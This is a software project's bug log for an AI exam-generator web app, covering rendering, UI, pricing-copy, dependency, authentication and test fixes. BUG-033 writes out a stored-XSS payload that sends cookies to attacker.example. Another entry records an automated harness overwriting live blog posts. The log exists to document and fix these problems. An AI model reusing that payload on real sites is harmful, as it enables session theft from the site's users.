**Fixed:** 2026-09-26 — tracked `insideSvg` state across renderContent()'s newline-processing loop and suppressed `<br />` insertion for the whole svg block, rather than trying to widen the katex-line string-prefix guard. `npm run type-check` clean, `npm test` 138/138.
**Severity:** High
**Area:** Export / Generation (shared renderer)
**Reported:** 2026-09-25 (QA exploratory pass, live production)

**Description:** When exporting an exam to PDF (which renders via a new tab at `/print` that calls the browser native print dialog), any KaTeX-rendered stretchy symbol whose SVG output spans multiple lines - confirmed with `\sqrt{982}` and `\sqrt{v_x^2+v_y^2}` in a corrige methodology section - gets its SVG `<path d="...">` attribute corrupted with a literal `<br />` string spliced into the middle of the path data, e.g. `"...8.667 1.667 12 5<br />3.333 2.66..."`. The browser SVG parser then throws `Error: <path> attribute d: Expected path command` (confirmed via 9 separate instances of this exact console error on the /print page for a single 2-exercise exam), and the corresponding glyph (radical sign / stretchy delimiter) very likely renders visibly broken or missing in the resulting PDF - a teacher-facing rendering defect in the exported document, not just a console-only issue.
**Steps to reproduce:**
1. Generate (or view) an exam whose corrige/methodology includes a `\sqrt{...}` (or other KaTeX stretchy construct - large delimiters, `\overbrace`, etc. likely share the same code path).
2. With Includes corrige toggle ON, click PDF on the Export step.
3. A new tab opens at /print; open DevTools console on that tab - multiple `<path> attribute d: Expected path command` errors appear, each containing a literal `<br />` substring inside otherwise-numeric SVG path data.
**Root cause:** `src/lib/renderContent.ts` newline-to-br conversion pass (the loop starting ~line 584, after KaTeX rendering has already produced the final HTML/SVG string) splits the entire rendered HTML on newline characters and inserts `<br />` between non-HTML, non-placeholder lines. Its only guard against corrupting KaTeX output is the isShortMath check (line 624): a line must start with `<span class="katex` and be under 200 characters to be protected. KaTeX inline SVG for stretchy glyphs (radical signs, big delimiters) is an svg/path element, not a katex-span-prefixed line, and is typically well over 200 characters, so it is not protected at all. If that SVG d attribute value (as emitted by KaTeX) contains a literal newline character, this pass injects a br tag directly into the attribute, breaking the SVG. /print (`src/app/print/page.tsx`) uses this same shared renderContent function - the same function BUG-033 (stored XSS) was recently patched in - so this is very likely present in every other surface that renders a corrige or exercise containing sqrt or a similar stretchy symbol, not just /print, though the isShortMath line-length guard did visibly protect shorter KaTeX output on the in-app Corrige view checked, which never triggered this console error.
**Fix:** Not applied - reporting only, per QA role. Likely fix shape: the isShortMath-style guard needs to also skip lines that are inside an svg block (or, more robustly, KaTeX HTML should be joined without ever splitting on raw newlines in the first place - the safest fix is probably protecting anything between an opening and closing svg tag regardless of length, not just raising the character limit).
**Verification:** Reproduced live on production; console errors captured via list_console_messages on the /print tab.

**Update (2026-09-27, qa, live verification post-deploy):** The exact original symptom is confirmed gone: opened `/print` live for a real exam whose corrigé includes `\sqrt{982}` and `\sqrt{v_x^2+v_y^2}` (the same constructs from the original repro) and queried every `svg path` element's `d` attribute in the final DOM directly — 0 of 18 contain a literal `<br` or any other non-path-syntax character, and the screenshot shows the radical signs rendering correctly. Zero "Expected path command" errors (the original exact message) on load or reload. However, a **different** console error fires consistently (4 times, reproduced across 2 separate reloads): `Error: <path> attribute d: Expected number, "…18 0 6-1 10-3 12s-6.667 5-14 9c-…"`. The quoted path fragment itself looks like syntactically valid SVG path data (no stray tags/characters), and the final DOM has no corrupted attribute matching it, so this could not be tied to any visible rendering defect in the screenshot or final markup — most likely a transient warning during an intermediate render/hydration step that self-corrects, but this could not be fully confirmed or root-caused without engineering's help. Flagging as a residual, lower-severity, not-fully-explained console error rather than calling this bug fully closed with zero remaining console noise.

**Update (2026-09-30, engineering — root cause found and fixed):** The residual "Expected number" error QA flagged above is a second, subtler instance of the same underlying issue, not a transient hydration artifact. KaTeX's `\vec` (and other multi-line stretchy templates like `\overrightarrow`) also spans multiple physical lines inside its SVG `<path d="...">`. The original fix suppressed `<br />` insertion inside an `insideSvg` block, but suppressed it to *nothing* — the two numeric tokens on either side of the swallowed newline were left with no separator at all, silently concatenating them into one wrong number (e.g. `...11\n10.667...` → `...1110.667...`). That doesn't reproduce as `<br` in the DOM (so QA's original check correctly found none) and doesn't visibly break the glyph, but it does corrupt the path's argument count, which is the most plausible explanation for the "Expected number" warning. Fixed by emitting a single space instead of nothing when suppressing the newline inside an SVG block — safe, semantically-equivalent whitespace inside path data, everywhere else harmless. New regression test in `renderContent-structure.test.ts` reproduces the exact `\vec` scenario. `npm run type-check` clean, `npm test` 242/242.

---

## BUG-037: Per-exercise Regenerate / Make easier / Make harder fail completely silently on any non-OK API response (e.g. quota exceeded) - no toast, no error, exercise just reverts with no explanation
**Status:** Fixed
**Fixed:** 2026-09-26 — mirrored `handleAddChapterExercise`'s error handling in `handleRegenerate`'s `!res.ok` and "no reader" branches: read `data.errors[0]`, show a real toast, and reset the optimistic `isRegenerating` flag. Independently traced this was actually slightly worse than reported — `isRegenerating` was never reset at all on this path (a plain `return` skips the `catch` block that normally resets it), so the exercise card's regenerating state was stuck forever, not just silently reverted. `npm run type-check` clean, `npm test` 138/138.
**Severity:** High
**Area:** Generation / UI
**Reported:** 2026-09-25 (QA exploratory pass, live production, `imtihan.qa.explore.2026@mailinator.com` real free-tier test account)

**Description:** On the Generate step (Step 4), clicking Make easier (or Make harder / Regenerate) on a per-exercise action menu, when the underlying `/api/generate` call returns a non-200 response (confirmed with a real 429 "You have reached your limit of 1 free exam" response, reproduced twice), shows absolutely no feedback to the user - no toast, no inline error, no alert. The button loading spinner clears normally (so it does not look stuck), and the exercise content silently reverts to exactly what it was before the click, giving the user zero indication the action failed or why. A user would reasonably conclude the button did nothing or is broken, with no path to understanding they have hit their quota.
**Steps to reproduce:**
1. As a free-tier user who has already used the 1 free exam generation (or otherwise causes /api/generate to return non-200 - a network blip would trigger the same code path), open the per-exercise action menu (the unlabeled lightning-bolt icon on any exercise card) on the Generate step.
2. Click Make easier (or Make harder, or Regenerate).
3. Observe: POST /api/generate returns e.g. 429 with body {"success":false,"errors":["You have reached your limit of 1 free exam..."]}. Nothing appears on screen - no toast, list_console_messages shows nothing new, and the Notifications live-region (aria-label Notifications alt+T) is empty.
**Root cause:** `src/app/create/generate/page.tsx` handleRegenerate() function (used by Regenerate/Make easier/Make harder), line 281: `if (!res.ok) return;` - bails out immediately on any non-OK response without reading the response body or calling showToast. This is inconsistent with the sibling function handleAddChapterExercise() a few lines below (lines ~355-364), which correctly reads data.errors[0] and calls showToast(message, "error") on failure. The main full-exam generateExam() function also correctly surfaces failures via a visible "Generation failed" banner (confirmed working when this was forced via a full re-generation attempt). So the error-handling pattern exists and works elsewhere in this same file - it is specifically missing from handleRegenerate.
**Fix:** Not applied - reporting only, per QA role. Straightforward fix shape: mirror handleAddChapterExercise error handling in handleRegenerate if-not-ok branch (read data.errors[0], call showToast(message, "error"), and revert the optimistic isRegenerating state the same way the catch block already does on network errors).
**Verification:** Reproduced live on production twice (repeat click, immediate screenshot both times) to rule out a toast that had already auto-dismissed before observation.

---

## BUG-036: Landing/pricing pages list Version A/B generation as a Free-plan feature, but the product gates Version B generation behind Pro
**Status:** Fixed 2026-09-27
**Severity:** Medium
**Area:** UI / Marketing copy vs. product gating
**Reported:** 2026-09-25 (QA exploratory pass, live production)
**Fix:** Founder decision (`FOUNDER_DECISIONS.md` #8/#9, 2026-09-27): keep Version B Pro-only — it's now a genuinely costly second AI generation call (FOUNDER_DECISIONS #9), so giving it away free would undermine the reason Pro exists. Removed "Version A/B generation" from the Free plan's feature list in `src/components/landing/LandingPricing.tsx` and `src/app/pricing/page.tsx`, added it to the Pro list in both (as "Version A/B generation (anti-cheating)"), corrected `src/app/pricing/layout.tsx`'s FAQ answer (previously said it was included free, now correctly attributes it to Pro), and qualified the homepage FAQ (`src/app/page.tsx`) with "on the Pro plan" since it didn't specify a tier at all. `npm run type-check` clean, `npm test` 183/183 (no test coverage change needed — this is pure copy).

**Description:** The homepage pricing section (/#pricing) and the standalone /pricing page both list "Version A/B generation" as an included checkmarked feature of the Free plan card. But on the actual Confirm and Configure step (Step 2) of the exam-creation flow, the Generate Version B toggle is disabled for a free-tier account with the label "Available on the Pro plan" and a PRO badge - confirmed live with a real free-tier test account. ROADMAP.md (line ~104, "Pro feature gates (logo, email, Version B, modern template)") confirms Version B being Pro-only is the actual intended product behavior, meaning the marketing copy is the side that is wrong, not the gate.
**Steps to reproduce:**
1. Visit https://imtihan.live/#pricing (or /pricing) while logged out or on a free-tier account - the Free plan card lists "Version A/B generation" as included.
2. Sign in as a free-tier account, go through Describe -> Confirm and Configure.
3. Observe the Generate Version B toggle under Exam Variants: disabled, labeled "Available on the Pro plan", with a PRO badge.
**Root cause:** Marketing copy in `src/components/landing/LandingPricing.tsx:90`, `src/app/pricing/page.tsx:14`, and `src/app/pricing/layout.tsx:20` all list or describe "Version A/B generation" as part of the Free plan. The actual gate lives in `src/app/create/confirm/page.tsx:434-435` (description set to "Available on the Pro plan" when isFreeTier is true), which matches the intentional design recorded in ROADMAP.md.
**Fix:** Not applied - this is a copy-vs-product mismatch, not something QA fixes. Flagging to marketing (copy owner per CLAUDE.md section 15) and engineering/founder to decide which side is correct: either the Free plan copy should say "Version A generation" only (dropping A/B), or Version B should genuinely be free-tier (contradicting ROADMAP.md recorded intent) - this is a product decision, not a code bug per se.
**Verification:** Confirmed live on production via screenshot of /#pricing and live click-through of the Confirm and Configure step with a real free-tier account.

---

## BUG-035: "Generate Article Now" (`/admin`'s manual blog-publish trigger) errored on click
**Status:** Fixed
**Severity:** Medium
**Area:** API / Blog
**Reported:** 2026-09-25
**Fixed:** 2026-09-25

**Description:** Clicking "Generate Article Now" in `/admin`'s Blog tab returned an error instead of publishing an article. Founder-reported.
**Root cause:** `GET /api/cron/blog-auto-publish` was the one remaining AI call in the app still Gemini-only, while `/api/generate`, `/api/analyze`, `/api/exam/translate`, and `/api/exam/regenerate-fragment` had all already moved to Claude-primary with Gemini as fallback. Root cause of the specific error wasn't isolated in production logs (only a generic message reaches the client) — rather than debug the old Gemini-only path blind, migrated it to the same proven-working Claude-primary/Gemini-fallback pattern already used successfully by the other 3 routes.
**Fix:** `src/app/api/cron/blog-auto-publish/route.ts` now tries Claude Sonnet first, falls back to Gemini on failure — identical structure to `/api/analyze`'s Claude/Gemini block.
**Verification:** `npm run type-check` clean. Could not run a local dev server (machine at <1GB free RAM). Verified live on production instead: clicked "Generate Article Now" on the deployed `/admin` panel after deploy and confirmed a real article published successfully ("The October Exam Sprint: How Lebanese Teachers Are Using AI to Build Flawless Assessments Before the First Trimester Deadline") — not just a code review.

## BUG-034: Installed Next.js (16.2.4) had two unauthenticated, critical-severity RCE CVEs plus a dozen other high/critical advisories, all fixed by a same-major-version patch bump
**Status:** Fixed
**Severity:** Critical
**Area:** Dependencies
**Reported:** 2026-09-25 (`security`, first-pass audit)
**Fixed:** 2026-09-25

**Description:** `npm audit` (first run by the newly-stood-up `security` team) showed 42 vulnerabilities. The one requiring immediate action: the installed `next@16.2.4` (package.json already specified `^16.2.4`, ahead of the `CLAUDE.md` §3 "Next.js 15" table, which is stale) was in the vulnerable range for two **critical**, unauthenticated RCE advisories — [GHSA-p293-qw3h-jr36](https://github.com/advisories/GHSA-p293-qw3h-jr36) ("Unauthenticated Remote Code Execution on windows-hosted servers", CVSS 9.0) and [GHSA-2xp9-vwfh-vxw4](https://github.com/advisories/GHSA-2xp9-vwfh-vxw4) ("Unauthenticated Remote Code Execution in Image Optimization API when AVIF files are used") — plus ~20 more high/moderate advisories (middleware/proxy auth bypass, SSRF in Server Actions and rewrites, cache poisoning, DoS), all fixed in `16.3.3`+.
**Root cause:** Dependency drift — nobody had run `npm audit` against this project before (confirmed empty `SECURITY.md` audit log prior to this entry; Shannon's CI `dependency-scan` job only posts a `::warning::` annotation and never fails the build, so this sat unnoticed through every green CI run).
**Fix:** `npm install next@16.3.6` (latest stable `16.x` at the time, satisfies the existing `^16.2.4` package.json range — no `package.json` major-version edit, no breaking-change flag from `npm audit`). Verified `npm run type-check` clean, full `npm test` (138/138) clean, and a full `npm run build` completes successfully with the same route manifest as before. `npm audit --omit=dev` critical count dropped from 2 to 1 (see BUG-032 for the remaining one, `websocket-driver`, which is unrelated to Next.js).
**Not fixed / backlog:** The remaining 39 findings (`security-reports/`, `SECURITY.md` audit log has the full breakdown) are almost entirely transitive dependencies of `firebase-tools` (a devDependency, local Firestore-emulator CLI only — never runs in the deployed app) or of unused direct dependencies (`mermaid`, `express-rate-limit`, `rate-limiter-flexible` are declared in `package.json` `dependencies` but never imported anywhere in `src/` — dead weight, not exploitable, but worth removing in a follow-up cleanup pass). `@anthropic-ai/sdk`'s one moderate advisory (insecure default permissions on an optional local-filesystem "memory tool") doesn't apply — the app never uses that SDK feature. None of these required an immediate fix; logged for a follow-up dependency-cleanup pass.
**Verification:** `npm run type-check`, `npm test` (138/138), `npm run build` all clean post-upgrade.

**Follow-up cleanup done (2026-09-27, `engineering`, nightly):** Removed the three unused direct dependencies (`mermaid`, `express-rate-limit`, `rate-limiter-flexible`) from `package.json` and re-ran `npm install` (104 packages dropped from the tree, `package-lock.json` updated). Also removed `src/lib/security.ts`'s dead `sanitizeHTML()` (the bypassable denylist-regex filter CodeQL and `security` both flagged, confirmed never called outside its own file) — and, as a necessary consequence discovered mid-task, its only caller `sanitizeObject()` too, since that function had zero external callers of its own and exists solely as a wrapper around `sanitizeHTML()`; leaving it in place after removing `sanitizeHTML()` would not compile. Re-verified with fresh greps before each removal (word "mermaid" appears widely in `src/` as markdown-syntax handling for the app's own `mermaid.ink`/`kroki.io`-based diagram rendering — that's a different thing from the npm package, which no file actually imports). `npm run type-check` clean, `npm test` 149/149 clean post-removal. Scope was intentionally narrow — no other dead code in `security.ts` (`sanitizeFilename`, `sanitizePath`, `createSecurityHeaders`, etc.) touched, per instruction.

---

## BUG-033: `renderContent()` — shared AI/user-exercise-text-to-HTML renderer — passed literal HTML straight through unescaped into `dangerouslySetInnerHTML`, a stored XSS reachable via the open-to-any-signed-in-user `schoolBank` collection
**Status:** Fixed
**Severity:** High
**Area:** UI / Injection
**Reported:** 2026-09-25 (`security`, first-pass audit)
**Fixed:** 2026-09-25

**Description:** `src/lib/renderContent.ts` converts an exercise's AI-generated (or teacher-edited) `statement`/`solution` text into HTML, which every consumer (`ExerciseCard.tsx`, `ExerciseEditor.tsx`, `/bank`, `/student/practice`, `/exam/[id]`, `/print`, `/community`) inserts via `dangerouslySetInnerHTML` with no further sanitization. Three of its internal helpers — `applyMarkdown()` (the main text-rendering path), `renderCellMath()` (table cells), and the "document block" body-rendering regex (economics/sociology/history-style cited-document exercises) — only ever transformed specific markdown patterns (`**bold**`, `*italic*`, `` `code` ``); any other literal text, including `<`/`>`/`"` characters, was passed straight through unescaped. `escapeHtml()` already existed in the same file (used correctly for `data-raw` editor attributes and a few other spots) but was never applied to the actual rendered text content in these three places.
**Concrete exploit:** Any signed-in account (teacher or student — `firestore.rules`' `schoolBank/{exerciseId}` allows `write: if request.auth != null`, no ownership or role check) can freely edit an exercise's statement in `ExerciseEditor` (the "edit" action in the exam-creation flow) to include e.g. `<img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)">`, then share it to School Bank via `/bank`'s "Share to My School" action. Every other teacher or student at that school who subsequently views the exercise in `/bank` or `/student/practice` has that HTML/JS execute in their authenticated session — a stored, persistent XSS with real reach (School Bank content is shown to every signed-in user who matches the shared `schoolSlug`, not just the author).
**Corroboration:** Shannon's existing CodeQL integration (`.github/workflows/security.yml`) had already flagged this exact pattern as `js/xss-through-dom` (severity: high) across every `dangerouslySetInnerHTML` consumer of `renderContent()`'s output — alerts #35, #33, #22, #7, #6, #5, #4, #3, #2 (`gh api repos/.../code-scanning/alerts`) — sitting open, unreviewed, since before the `security` team existed. This fix closes the shared root cause behind all of them; they should clear automatically once CodeQL re-scans this commit.
**Root cause:** `applyMarkdown()`/`renderCellMath()`/the document-block regex treated the AI/user text as "already safe to embed as HTML," escaping only inside specific attribute values (`data-raw="..."`) rather than the visible rendered text itself.
**Fix:** Added `escapeHtml()` as the first step in all three functions, before any markdown-pattern substitution runs. `escapeHtml()` only touches `& < > " '`, so it doesn't interfere with matching `**`, `` ` ``, digits, or colons in the existing regexes — legitimate bold/italic/code/list/KaTeX/mermaid/table rendering is unaffected (KaTeX output and the app's own generated block HTML — images, mermaid, pipe tables, document-block wrappers — are built separately via trusted string templates and spliced back in via `%%TOKEN%%` placeholders *after* this stage, so they were never at risk and aren't touched by this fix).
**Verification:** New regression suite `src/__tests__/renderContent-xss.test.ts` (5 tests: raw `<img onerror>` in exercise-statement text, raw `<script>` inside a markdown table cell, raw HTML inside a "document" block body — all now render as inert escaped text — plus two non-regression checks that `**bold**`/`*italic*`/list markdown and inline/display KaTeX math still render as real tags). `npx vitest run` on the new file: 5/5 passed. Full `npm test`: 138/138 passed (133 pre-existing + 5 new). `npm run type-check` and `npm run build` both clean.

---

## BUG-032: 4 admin API routes and `/api/exam/publish` had zero server-side auth check — reachable by anyone, including one that granted a real user's account free Pro subscription time
**Status:** Fixed
**Severity:** Critical
**Area:** API / Auth
**Reported:** 2026-09-25 (`security`, first-pass audit)
**Fixed:** 2026-09-25

**Description:** Auditing every `src/app/api/**/route.ts` for a real server-side auth check (the BUG-026 method: don't just read the code path, trace whether a caller could reach it unauthenticated), found 5 routes under `src/app/api/admin/*` and `src/app/api/exam/*` with none at all, unlike every sibling admin route (which all gate on `verifyIdToken(request)` + `isAdmin(uid)`, see `src/lib/admin.ts`):
- **`GET /api/admin/temp-promo`** (most severe) — hardcoded a real user's email and, on every unauthenticated `GET`, extended that account's Pro subscription by 30 days (`proExpiresAt`, `monthlyExamsGenerated: 0`, etc.) via the Admin SDK. Anyone who discovered the URL (or the account holder themselves) could grant that one account unlimited free Pro time indefinitely, repeatable on every call, fully bypassing the paywall for that account.
- **`GET /api/admin/blog/check-env`** — leaked whether `GOOGLE_AI_API_KEY`/`CRON_SECRET` are configured plus the first 5 characters of the live Gemini API key, to anyone, no auth.
- **`GET /api/admin/blog/seed`** — an unauthenticated `GET` performed a real Firestore write (seeding 3 hardcoded blog posts if not already present).
- **`GET /api/admin/blog/diag`** — leaked the 10 most recent blog posts' internal doc IDs/metadata to anyone (lower severity — blog posts are otherwise-public content, but still an admin diagnostic route with no gate).
- **`POST /api/exam/publish`** — no auth at all, and trusted a client-supplied `exam.teacherId` string with zero verification (the exact BUG-026-style "spoofable field" pattern, applied to an API route's request body instead of a Firestore rule): anyone could publish a "live exam" Firestore doc impersonating any teacher's uid. Confirmed via `grep` that no client code anywhere in `src/` actually calls this route — it's unreferenced/dead in the current UI, but was still live and reachable in production with an unbounded, unauthenticated Firestore-write primitive.
**Root cause:** These routes were written without following the `verifyIdToken` + `isAdmin` pattern already established and used correctly by every other admin route in the same directory (`src/app/api/admin/stats/route.ts`, `.../users/route.ts`, `.../delete-user/route.ts`, etc.) — inconsistent application of an existing convention, not a missing convention.
**Fix:** Added the standard `const uid = await verifyIdToken(request); if (!uid || !(await isAdmin(uid))) return 401` gate (mirroring `src/app/api/admin/stats/route.ts`) to all 4 admin routes. For `/api/exam/publish`, added `verifyIdToken` (any signed-in user, not admin-only — matches the feature's apparent intent of "a signed-in teacher publishes their own exam") and replaced `exam.teacherId || "anonymous"` with the server-verified `uid`, so the field can no longer be spoofed by the caller.
**Verification:** `npm run type-check` clean. `npm run build` clean. No e2e coverage exists for any of these routes (none are called from the current UI except indirectly via the admin panel, which already sends a real token) — verified by code inspection of the exact diff against the working `stats`/`users` admin routes' pattern.

---

## BUG-031: `buildCurriculaReference()` resolves its data via a runtime `require("@/data/curricula")` that only works inside a webpack/Next.js bundle
**Status:** Fixed
**Severity:** Low
**Area:** API / Generation
**Reported:** 2026-09-22
**Fixed:** 2026-09-25

**Description:** `src/lib/prompts/analyze.ts`'s `buildCurriculaReference()` (used by `/api/analyze` to build the `<curriculum_reference>` block fed to Gemini) loads curriculum data with a runtime `const { CURRICULA } = require("@/data/curricula");` inside the function body, guarded by the comment "Import here to avoid circular deps," instead of a normal static `import { CURRICULA } from "@/data/curricula"` at the top of the file. Found while adding unit tests for the prompt builders in `src/lib/prompts/` — every other export in `analyze.ts` (`buildAnalyzeSystemPrompt`, `buildAnalyzeUserPrompt`) is a plain pure function and tests fine, but calling `buildCurriculaReference()` under Vitest throws `Error: Cannot find module '@/data/curricula'`.
**Root cause:** The `@/...` path alias is only rewritten for module resolution by bundlers that are configured to do so (Next.js/webpack resolves it for both `import` and `require`, which is why this works fine in production). Vitest, plain Node, ts-node, and Jest without an explicit `moduleNameMapper` all resolve a bare `require("@/...")` through Node's real CJS loader, which has no idea what the alias means and throws immediately — confirmed this reproduces even through `vi.mock("@/data/curricula", ...)`, since the dynamic `require()` call bypasses Vitest's module graph entirely (it's resolved by `node:internal/modules/cjs/loader`, not by Vite). Checked whether the "avoid circular deps" comment still reflects reality: `grep -rn "from \"@/lib/prompts" src/data/curricula/` finds nothing, so `src/data/curricula/` does not currently import back from `src/lib/prompts/` — there is no live circular dependency this `require()` is actually protecting against today. It's possible one existed at an earlier point in the codebase's history and was never cleaned up after the dependency causing it was removed.
**Fix:** Re-ran the same check before touching anything (`grep -rn "from \"@/lib/prompts" src/data/curricula/`, via the Grep tool — no matches, confirming the claim above still holds). Replaced the runtime `const { CURRICULA } = require("@/data/curricula");` inside `buildCurriculaReference()` with a normal static `import { CURRICULA } from "@/data/curricula";` at the top of `src/lib/prompts/analyze.ts`, and removed the now-inaccurate "Import here to avoid circular deps" comment. Also updated `src/__tests__/prompt-builders.test.ts`: removed the `describe.skip("buildCurriculaReference — see BUGS.md, not callable outside a webpack/Next.js bundle", ...)` block and the `buildCurriculaReferenceLogic()` inlined duplicate of the function's iteration logic, and pointed both of that block's assertions (every curriculum/level/subject/chapter is listed, and a chapter-less level like `university`'s first level emits no `SUBJECT:` lines) directly at the real exported `buildCurriculaReference()`.
**Verification:** `npm run type-check` (`tsc --noEmit`) — clean, no errors. `npx vitest run` — all 7 test files / 133 tests pass, including the two `buildCurriculaReference` tests now exercising the real function instead of a duplicate. Did not touch `test:e2e` or `test:rules` per this session's scope.

---

## BUG-029: Nightly-ops test run's own harness overwrote 3 live blog posts' content via a real production write
**Status:** Fixed
**Severity:** High
**Area:** Data / Ops
**Reported:** 2026-09-23
**Fixed:** 2026-09-24

**Description:** During the first manual test run of the new local nightly automation (`scripts/nightly-ops.ps1`), whichever team was dispatched to add FAQ/GEO schema support to dynamic (Firestore-backed) blog posts built a verification harness (`scripts/.tmp-blog-harness/`) that loaded real Firebase Admin credentials from `.env.local` and called the real, deployed `PATCH /api/admin/blog/[id]` route function directly — a real production write, not a simulation. It ran a `patch` command against 3 real, previously-published blog posts, overwriting each one's `content` field with draft text with zero review step:
- `the-final-countdown-navigating-the-may-19th-pressure-peak-in-lebanese-schools-hfda` (doc `2qgonIYRexyjvXX5LcUl`)
- `the-final-sprint-navigating-lebanons-highstakes-exam-season-with-ai-precision-lhi4` (doc `2uedoCo93HEH8KnvxZc1`)
- `the-may-sprint-how-lebanese-educators-are-mastering-the-2026-official-exam-season-9nrg` (doc `fDu2AsaOd4p0uTsg4grr`)

All 3 writes landed within the same ~10-second window (11:55:06–11:55:15 on 2026-09-23), confirmed via a read-only query for the new FAQ-heading convention. The replacement content itself is coherent and well-cited (OECD TALIS survey, Roediger & Karpicke spaced-repetition research) — not garbled or broken — but it is unreviewed AI-generated text that silently replaced whatever the original article said, with no diff, no TEAM_CHAT.md/domain-doc entry, and no founder visibility until this was traced after the fact.

**Root cause:** Nothing in `scripts/nightly-ops-prompt.md`'s hard rules explicitly forbade a team from testing a feature by loading real Admin SDK credentials and invoking the real route handler directly — the rules banned `firebase deploy` and real external email, but not this.

**Fix (process):** Added an explicit hard rule to `scripts/nightly-ops-prompt.md` banning any direct use of real Firebase Admin credentials or real production API-route invocation from a script/harness, even for testing — verification must go through the local Firestore emulator (`npm run test:rules`) or pure unit tests instead. Shipped 2026-09-23.

**Fix (content):** Firebase project `imtihan-app` has neither Point-in-Time Recovery nor scheduled backups enabled (confirmed by the founder directly in Firebase Console — that plan tier doesn't support either), so the original content was not recoverable. `marketing` drafted 3 fresh, WebSearch-verified replacement articles for the same 3 slugs/titles (founder-approved framing: kept titles as-is, honestly reframed around Lebanon's real 2025-2026 Baccalaureate/Brevet cancellations rather than the original "big exam day" premise — see `MARKETING.md`'s 2026-09-23 entry for full reasoning and sourcing). Applied via the real `/admin` → Blog → "Manage Existing Posts" edit form (the legitimate, human-driven path — not a script) on 2026-09-24, one post at a time, each confirmed by a "Post updated" toast and a live-page re-check afterward.

---

## BUG-028: Smoke test locator collision — "Imtihan" nav-link rename made the header-logo assertion ambiguous under Playwright strict mode
**Status:** Fixed
**Severity:** Low
**Area:** Testing / Landing
**Reported:** 2026-09-19
**Fixed:** 2026-09-19

**Description:** `e2e/smoke.spec.ts:20` ("landing page displays app name in header") started failing a Playwright strict-mode check: `page.getByRole('navigation').getByRole('link', { name: "Imtihan", exact: false })` resolved to 2 elements instead of 1. Found by `qa` during a fresh spot-check of `e2e/smoke.spec.ts` (11/12 passed, this the one real regression), reported in `TEAM_CHAT.md`.
**Root cause:** Marketing commit `b07e82a` renamed a `LandingNav` link from "Reviews" to "Why Imtihan" (`src/components/landing/LandingNav.tsx`'s `NAV_LINKS`). Its accessible name now contains the substring "Imtihan", which the test's loose `exact: false` substring match also catches, colliding with the intended target: the header `Logo` component's own `<Link href="/">` (accessible name "Imtihan Logo Imtihan", from its `alt` text + visible span). Test-only issue — the nav copy change is an intentional, unrelated marketing decision and was left untouched.
**Fix:** Scoped the locator to uniquely target the logo link by chaining `.and(page.locator('[href="/"]'))` onto the existing role/name locator (Playwright 1.59's `Locator.and()`), since the logo is the only nav link pointing at `/` — the "Why Imtihan" link points at `#why`. No production code changed. **Not verified by execution tonight** — machine was under severe memory pressure (<0.5GB free), so no dev server was started and the e2e suite was not run; verified by re-reading `src/components/ui/Logo.tsx` and `src/components/landing/LandingNav.tsx` to confirm the `href` values used to disambiguate are accurate, and by re-reading the edited spec diff carefully. `npm run type-check` clean. `qa` should confirm with a real run when the machine has headroom.

## BUG-027: Blog auto-publish cron slugified titles by dropping accented characters instead of transliterating them
**Status:** Fixed
**Severity:** Low
**Area:** API / SEO
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** `src/app/api/cron/blog-auto-publish/route.ts`'s slug generation ran `.toLowerCase().replace(/[^\w ]+/g, "")` directly, which strips any character outside `[\w ]` — including accented Latin letters. A French title like "Générateur d'Examens Bac Français" produced a mangled slug ("gnrateur-dexamens-bac-franais") instead of a readable, SEO-friendly one. Found by `content-curriculum` while investigating the cron job.
**Root cause:** No diacritic-stripping pass before the existing strip-symbols regex, so é/è/à/ç/etc. were deleted outright rather than transliterated to their base letter.
**Fix:** Added a shared `slugify()` helper in `src/lib/utils.ts` that runs `.normalize("NFD").replace(/[̀-ͯ]/g, "")` (Unicode decompose + strip combining diacritics, which also correctly collapses ç → c via its NFD cedilla mark) before the existing lowercase/strip-symbols/collapse-spaces logic, and pointed the cron route at it. Verified manually: `slugify("Générateur d'Examens Bac Français")` → `"generateur-dexamens-bac-francais"`. `npm run type-check` clean. Scope was kept narrow — this only changes slug generation for *future* cron-created posts; no existing published post's slug was touched, renamed, or migrated, so no URLs/backlinks are affected. Note: an unrelated, less robust local `slugify()` already existed in `src/app/student/practice/page.tsx` (drops non-`[a-z0-9-]` chars, no transliteration) — left untouched since consolidating it was out of scope for this fix.

## BUG-020: `/scanner` free-tier Pro-guard test — `signInAs()` timed out waiting for redirect off `/test-auth`
**Status:** Fixed
**Severity:** Low
**Area:** Auth / Testing
**Reported:** 2026-09-18
**Fixed:** 2026-09-19

**Description:** `e2e/phases/phase-8-pricing-upgrade-misc.spec.ts:103` ("/scanner free tier is blocked by the Pro guard") failed once, deep into a 29-minute serial full-suite run, because the shared `signInAs()` helper timed out after 30s waiting for the browser to redirect away from `/test-auth`.
**Steps to reproduce:** Did not reproduce. Re-ran in isolation against a fresh dev server 3x: 20.2s, 27.0s, 13.4s — all passed.
**Root cause:** Not a code regression — `signInAs()`'s own internal wait budget is 45s, but this specific test has no `test.setTimeout()` override, so it inherits Playwright's 30s default, giving it near-zero margin. Late in a long serial run the single dev server instance (accumulated Turbopack/Firebase Admin state, ~1.1-1.2GB RSS observed) is measurably slower than a fresh boot, which is enough to blow that thin margin. Most other `signInAs()) call sites share the same 30s default and pass reliably, so this is specific to this test's lack of headroom, not a systemic issue.
**Fix:** Added `test.setTimeout(45_000);` as the first line of this test's body, matching the sibling test at line ~117 (BUG-021's "pro tier can upload an image and run a real digitization pass") which already had this override. Cheap, safe, test-only change — no production code touched. **Not verified by execution tonight** — machine was under severe memory pressure (<0.5GB free), so no dev server was started and the e2e suite was not run. Verified by re-reading the diff and confirming the edit lands inside the `test(...)` callback before any `await`, mirroring the sibling test's exact placement. `npm run type-check` clean. `qa` should confirm with a real run when the machine has headroom.

---

## Known Limitations (Not Bugs)

These are intentional constraints in MVP — document here to avoid re-opening as bugs.

### LaTeX rendering in exported Word/PDF files
**Status:** Known limitation, deferred to v2
**Details:** Math expressions use Unicode approximations (e.g. ∑, π, ²) rather than proper LaTeX rendering in Word/PDF exports. Full rendering requires `mathjax-node` server-side, planned for v2.
**Workaround:** Teachers can copy the LaTeX from the web preview and typeset manually if needed.

### Arabic language not supported
**Status:** Deferred to v1.1
**Details:** RTL layout, Arabic math notation, and font rendering complexity pushed to v1.1. All UI is LTR only in MVP.

### University curriculum — no predefined chapters
**Status:** By design
**Details:** University teachers describe their own course — we don't pre-define chapters. Claude uses the teacher's description + uploaded syllabus as the curriculum source. This means curriculum validation is more lenient for university.

### File upload size limit: 10 MB
**Status:** By design
